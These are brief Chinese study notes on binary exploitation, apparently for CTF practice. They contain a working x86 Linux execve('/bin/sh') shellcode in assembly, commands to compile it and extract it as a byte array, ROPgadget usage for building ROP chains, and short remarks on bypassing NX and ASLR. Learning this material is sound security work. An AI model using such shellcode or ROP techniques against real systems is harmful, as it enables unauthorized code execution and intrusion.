##  一些资源
http://shell-storm.org
https://www.exploit-db.com
https://www.exploit-db.com/shellcode/
## shellcode


```x86asm
jmp sh
run:
  pop ebx
  mov BYTE[ebx+7],0 ;append 0 to /bin/sh
  xor eax,eax
  mov al,11
  xor ecx,ecx
  xor edx,edx
  int 0x80
sh:
  call run
  db "/bin/sh"
```

linux 下
- 使用`nasm [sourcecode] -o [target] -felf32`编译一个汇编文件 
- 使用`objcopy -O binary [source.out] [target]`提取 shellcode的。
- 使用`xxd -i [target]`将上述shellcode转为char数组

## ROP
 1. ROPgadget 得到代码片断
 2. cd80c3 就是int0x80;ret,s使用`ROPgadget --binary {binaryname} --opcode cd80c3`来寻找
### 寄存器赋值
构造栈结构
```
  *(pop eax ;ret)
  3
```
将eax赋值为3

## 漏洞挖掘方法
* 现成CMS注意DIFF
* 根据漏洞PATCH
* 根据漏洞写出EXP，发动攻击 
## 保护
NX:DEP 栈不可执行，可执行不可写 ROP绕过
ALSR: 把每次载入的函数地址随机化，利用puts/printf 等leak出libc的实际地址

## 打开就退出了
用strace分析系统调用
